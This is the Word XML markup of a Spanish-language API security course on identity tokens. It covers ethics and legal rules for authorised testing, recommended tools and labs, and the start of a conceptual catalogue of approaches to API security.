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Tokens de identidad, de Basic al DPoP — Clase completa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Edición extendida: historia, protocolos, ejemplos y diagramas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guion + explicación + laboratorio de seguridad de APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Versión 2.0 · Foco: seguridad ofensiva </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>autorizada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y defensa · Incluye el caso ID Uruguay.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Aborda la seguridad de APIs desde </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>todos los enfoques</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: qué se mira, cómo se defiende y para quién.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Índice</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>0. Cómo usar esta clase y reglas de ética/legal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1. El mapa completo: todos los enfoques para abordar la seguridad de APIs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2. Taxonomía de las APIs: qué estamos protegiendo exactamente</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3. Historia: de las credenciales al token atado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4. Los protocolos involucrados, de HTTP a DPoP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>5. Módulos técnicos (M1–M11)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6. La seguridad de API más allá del token, dominio por dominio</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>7. Laboratorio paso a paso (con ejemplos)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>8. Glosario de atajos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>9. Plantilla de reporte responsable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>10. Bibliografía</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>0. Cómo usar esta clase y reglas de ética/legal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo está armada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cada tecnología (Basic → DPoP) se explica con la misma estructura:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — qué problema resuelve y cuándo nació (primera aparición).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guion para explicar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — lo que decís en la charla / clase (texto hablado).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — algo concreto, reproducible, sin riesgo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — el "modo seguridad": qué puede fallar y cómo se verifica </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>en un entorno propio o autorizado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Defensa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — qué control mitiga ese fallo y con qué norma se referencia.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Pero la clase no termina en los tokens.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> El documento se amplió para cubrir la seguridad de una API </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>completa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 xml:space="preserve">La </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sección 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> presenta </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>todos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> los enfoques posibles para hablar de seguridad de APIs (30 lentes, agrupados en qué se mira, cómo se defiende y para quién).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">La </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sección 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>taxonomía</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: qué tipos de API existen (REST, GraphQL, gRPC, eventos, webhooks…) y qué riesgo trae cada uno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">La </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sección 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> son los </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>módulos técnicos de tokens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (M1–M11), de Basic al DPoP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">La </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sección 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> recorre, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>dominio por dominio</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, todo lo demás que hay que asegurar (autorización, gateway, rate limiting, validación, transporte, inventario, observabilidad, cadena de suministro, cumplimiento, privacidad, anti-patrones…).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Reglas de ética y legal (leé esto antes de cualquier prueba)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Regla de oro:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> probá vulnerabilidades únicamente contra (a) sistemas que vos construiste, (b) laboratorios diseñados para ser vulnerables, o (c) sistemas para los que tenés </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>autorización por escrito</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y un alcance definido.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Probar autenticación, robar/reutilizar tokens o manipular identificadores de objetos en sistemas de terceros </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sin autorización</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es acceso no autorizado y es delito, aunque "sólo sea mirar" o aunque el token lo hayas copiado de tu propio navegador.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Buenas prácticas mínimas:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tu cuenta, tu sesión, tu cliente:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> observar tu propio token en tu propio navegador es legítimo; reutilizarlo contra otros recursos o cuentas, no.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Alcance escrito:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> si vas a probar algo que no es tuyo, pedí permiso y guardá el correo/RFC de autorización.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No exfiltrás datos:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> si encontrás algo, demostrá el acceso con el mínimo dato necesario (p. ej. tu propio ID), nunca volcás la base.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Divulgación responsable:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> reportá al dueño del sistema o a su CERT. En Uruguay: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy (AGESIC)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Laboratorios recomendados:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OWASP crAPI, DVGA, OWASP Juice Shop, VAmPI, PortSwigger Web Security Academy (labs de JWT y OAuth).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Herramientas de la clase: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1F3B66"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, navegador con DevTools, Burp Suite Community / ZAP, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jwt_tool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PyJWT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Python), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>docker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gitleaks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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>ggshield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1. El mapa completo: todos los enfoques para abordar la seguridad de APIs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7271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circ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27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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Alrededor del token hay un sistema entero: gateway, IAM, MFA y más</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">No existe </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>una</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> forma de mirar la seguridad de una API. Existen muchas, y cada una ilumina algo distinto y esconde el resto. Esta sección es deliberadamente exhaustiva: primero el catálogo completo de enfoques —agrupados en tres familias según si miran </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>qué</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>cómo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>para quién</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>—, y al final una tabla comparativa y una recomendación de combinación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Las tres preguntas que ordenan todo:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Familia A — qué se mira:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el objeto de estudio (arquitectura, actores, datos, estilos, ciclo de vida).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Familia B — cómo se defiende:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> los mecanismos (autorización, criptografía, tráfico, validación, observabilidad, secretos).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Familia C — para quién y por qué:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el contexto (riesgos, gobierno, cumplimiento, privacidad, negocio, madurez).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Familia A — Enfoques según QUÉ se mira</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.1 Enfoque por capas de arquitectura.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¿en qué capa vive el control y en qué capa vive el atacante?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cliente → red → gateway → autenticación → autorización → lógica de negocio → datos.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charlas mixtas y diseño; es el más didáctico.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creo que "arreglé la autenticación" equivale a "arreglé la API".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.2 Enfoque por actor: persona, sistema y delegación.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¿quién invoca la API y en nombre de quién?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humano (browser/app), máquina (M2M), y el caso híbrido de un servicio actuando por una persona.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MFA, identidades no humanas, delegación (OAuth), consentimiento.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aplico el modelo de la persona a la máquina (pedir "MFA" a un microservicio) o dejo credenciales eternas en CI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.3 Enfoque por ciclo de vida de la credencial.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¿en qué eslabón se puede robar, reutilizar o perpetuar este token?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emisión → transporte → almacenamiento → uso → renovación → revocación → expiración.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es el enfoque de esta clase; permite hablar de access, refresh e ID token y sus relaciones.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hablo solo de firma y olvido rotación y revocación, donde ocurren la mayoría de los incidentes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.4 Enfoque por ciclo de vida del software (shift-left).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¿en qué fase del desarrollo se introduce y se detecta el riesgo?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diseño → desarrollo → build/CI → test → despliegue → runtime → retiro/decomisión.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para mover la seguridad a la izquierda y justificar automatización.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la seguridad queda como un pentest al final, cuando ya es caro corregir.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.5 Enfoque por superficie de ataque.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¿desde dónde me atacan y con qué activo?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cliente (token en JS/localStorage) · red (TLS, proxies) · backend (validación de claims) · cadena de suministro (CI, dependencias) · negocio (abuso de flujos).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para no subestimar las fugas "aburridas pero reales".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ignoro que la mayoría de los secretos filtrados son de máquinas, no de personas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.6 Enfoque por dato y contrato.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¿qué datos cruzan la API y qué promete el contrato?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esquema (OpenAPI/AsyncAPI/protobuf/SDL), validación de tipos, campos sensibles, versionado, compatibilidad, contract testing.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equipos con diseño API-first y catálogo de servicios.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el contrato y la implementación divergen, y aparecen campos no documentados y "shadow fields".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.7 Enfoque por estilo de API.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¿cómo cambian los riesgos según el paradigma (REST, GraphQL, gRPC, SOAP, WebSocket, webhooks)?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cada estilo tiene su clase de falla: sobre-fetch y query depth en GraphQL; métodos y enums por defecto en gRPC; XML y firma en SOAP; canales persistentes y autorización por mensaje en WebSocket; SSRF y firmas de webhook.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cuando la organización usa más de un estilo (casi siempre).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aplico recetas de REST a GraphQL o a eventos y dejo huecos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Ver detalle:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sección 2, "Taxonomía de las APIs".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.8 Enfoque por protocolo y transporte.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¿qué garantiza (y qué no) el canal?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HTTP/1.1, HTTP/2, HTTP/3/QUIC, TLS, mTLS, cabeceras, CORS, HSTS, PN.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cuando hay mTLS, service mesh, proxies que terminan TLS o clientes legacy.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asumo cifrado extremo a extremo donde hay terminación en un proxy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.9 Enfoque por tipo de consumidor.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¿la API es para mi propio front, para un partner, para el público o para uso interno?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first-party (SPA/móvil), interno (servicio a servicio), partner (contratos bilaterales), público/open (sin relación previa), marketplace de terceros.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para elegir el esquema de identidad y el nivel de confianza correcto.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trato igual a un socio contractual y a un cliente anónimo de Internet.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.10 Enfoque por modelo de despliegue.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¿dónde corre la API y qué cambia en cada modelo?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monolito, microservicios, serverless/funciones, edge, contenedores, service mesh, on-prem, nube, híbrido/multi-nube.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arquitecturas distribuidas y migraciones a la nube.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aplico supuestos de red plana a un entorno con malla, sidecars y tráfico este-oeste.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.11 Enfoque por tipo de identidad (humana vs. no humana).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¿cuántas identidades de máquina tengo frente a las humanas?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NHIs (service accounts, CI tokens, workloads, dispositivos), su ciclo de vida y su rotación.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cuando el grueso del tráfico es M2M (la mayoría de las APIs).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las NHIs quedan sin dueño ni rotación, y son las que más se filtran.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Familia B — Enfoques según CÓMO se defiende</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.12 Enfoque por paradigma de confianza.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¿confío en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>quién sos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (identidad) o en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>qué tenés</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (posesión/capability)?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ACL vs. capabilities, perimetral vs. Zero Trust, identidad vs. posesión.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para dar profundidad y justificar DPoP/mTLS.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no entiendo por qué "robar el token" es un ataque completo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.13 Enfoque por modelo de autorización.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¿cómo se decide si esta identidad puede hacer esta acción sobre este objeto?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RBAC, ABAC, ReBAC, PBAC, policy-as-code (p. ej. OPA), autorización a nivel de objeto y de función.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siempre que haya objetos por usuario (casi siempre).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la autenticación funciona y la autorización no; ahí vive BOLA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
